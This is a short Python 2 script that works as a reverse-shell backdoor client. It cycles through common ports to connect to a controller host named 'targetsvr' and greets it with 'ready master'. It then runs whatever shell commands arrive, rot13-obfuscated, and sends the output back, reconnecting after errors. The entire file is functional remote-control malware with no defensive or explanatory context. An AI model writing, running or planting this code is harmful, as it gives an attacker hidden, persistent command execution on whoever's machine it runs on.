import socket
import time
import subprocess
import sys

connected=False
ports = [21,22,80,443,8000]

while not connected:
    done=False
    mysocket=socket.socket()
    for port in ports:
        time.sleep(1)
        try:
            print "trying port ",port
            mysocket.connect(("targetsvr",port))
        except:
            print "Port ",str(port)," closed! trying next port."
        else:
            mysocket.send("ready master\n".encode("rot13"))
            print "connected"
            while not done:
                try:
                    command = mysocket.recv(10240).decode("rot13")
                    print type(command)
                    print command
                    if 'qu1t' in command:
                        print "quit command received"
                        done=True
                        mysocket.close()
                        break
                        #sys.exit()
                    if 'k1ll' in command:
                        print "kill command received"
                        sys.exit()
                    prochandle=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    prochandle.wait()
                    result = prochandle.stdout.read()+prochandle.stderr.read()
                    print "result len = "+str(len(result))
                    print result
                    if result:
                        print "there is output"
                        mysocket.send(result.encode("rot13"))
                    if not result:
                        print "there is no output"
                        mysocket.send("no output".encode("rot13"))
                except Exception as e:
                    print "Error: \n"+str(e)+"\n Restarting"
                    done=False
                    connected=False
                    break